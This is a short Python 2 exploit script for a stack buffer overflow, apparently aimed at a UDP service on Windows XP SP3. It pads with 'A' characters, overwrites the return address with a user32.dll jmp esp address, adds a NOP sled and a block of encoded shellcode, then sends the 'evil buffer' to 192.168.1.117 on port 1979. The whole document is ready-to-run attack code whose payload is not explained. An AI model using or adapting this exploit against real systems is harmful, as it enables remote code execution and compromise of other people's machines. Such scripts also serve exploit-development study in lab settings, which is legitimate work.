import socket
import sys

buf = 'A'*260 
buf += '\x53\x93\x42\x7e' #user32.dll jmp esp XP SP3
buf += '\x90'*16

buf += ( 
"\xd9\xc5\xd9\x74\x24\xf4\xba\x31\xe7\xd3\xe1\x5e\x29\xc9\xb1"
"\x54\x31\x56\x1a\x83\xc6\x04\x03\x56\x16\xe2\xc4\x59\x50\x46"
"\xc2\x5d\x8e\x47\xd3\xd6\x15\xac\xbb\x3d\x9f\xfd\x75\x73\x6f"
"\xec\x8a\x03\x9d\x93\xe7\xb8\xa7\x9d\x22\xd3\x0f\xf2\xd1\x19"
"\xbd\xb8\xc0\x8c\x3b\x74\xea\x6b\x13\xf5\xc1\xb0\x10\x9a\x14"
"\xed\x88\x7c\xc5\xaa\x30\xb3\x02\xda\x21\xb3\x9f\xd7\xef\x67"
"\x25\x03\xfb\x37\xc4\xf5\xf1\x57\xe6\xaf\xbf\xe6\xea\xe5\x4b"
"\xae\xed\x65\x73\x5e\x3e\x07\x3b\xc7\xfd\x48\x28\xeb\xf7\x04"
"\xf5\xe5\x07\xc4\x6f\x8a\x5a\xcf\xa6\xe8\xdb\x33\xf3\xd5\xa4"
"\x97\x16\x3d\x55\xe2\x18\x6a\x55\x15\x32\x16\x67\x94\x33\xa9"
"\xa0\x6a\x62\x0b\x14\xf5\x85\x0c\x60\xd6\xb0\xbf\x01\xaa\xe6"
"\x99\x55\x41\x89\x82\x95\x66\x0f\xc4\xbc\x54\xbb\x92\xe2\xd3"
"\xf2\xc3\x88\x15\xb8\x33\x04\xd6\xe1\x5e\xfe\x47\x51\xeb\x7e"
"\xd1\x4f\xdb\x29\xe4\x23\x45\xda\x1c\x17\xae\x8f\xfe\xdc\xaf"
"\x1b\x5d\xec\x9d\xfc\x68\x54\xd9\xdc\xc5\xa7\xed\x51\xd8\xfd"
"\x2f\xc3\x75\x93\xb1\xb8\x7e\xe1\xd8\x6d\x99\xfb\x7b\xcd\x1a"
"\xfa\x1c\x84\x67\x40\xb8\x81\x6b\x1b\xdc\x49\xdd\x8b\x34\x28"
"\xc2\xb8\xd9\x27\xb2\x84\x0a\xb6\xa6\xc4\x47\x41\xea\x59\xac"
"\x08\x97\xd8\xf0\x7b\xd1\x3b\x01\x52\xb3\x16\x9b\xef\x83\x2f"
"\xf8\xfe\xd7\x90\x17\x1e\x0e\xab\x0e\x05\x6f\x3c\xdb\xd7\x34"
"\x73\xff\x96\x8d\x3e\x43\x0e\x83\xc5\x33\x31\x8f\xcd\x13\x02"
"\xf7\x3c\x41\xe5\xfc\x1c\xaa\xbd\x12\xfb\x71\x56\x72\xf2\x47"
"\x3a\xc7\x09\x4b\x6f\x87\xfb\x8d\xfe\xfa\xc7\xa1\xcc\xd0\xbd"
"\x92\x88\xfb\x96\x32\xdd\x72\x59\x65\x80\xc7\x92\x9b\x5b\xbd"
"\x82\x83"
)

try:
    sc = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #udp socket
    sc.connect(("192.168.1.117", 1979))
    sc.send(buf + "\n")
    print "[+] Evil buffer sent"
    sc.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
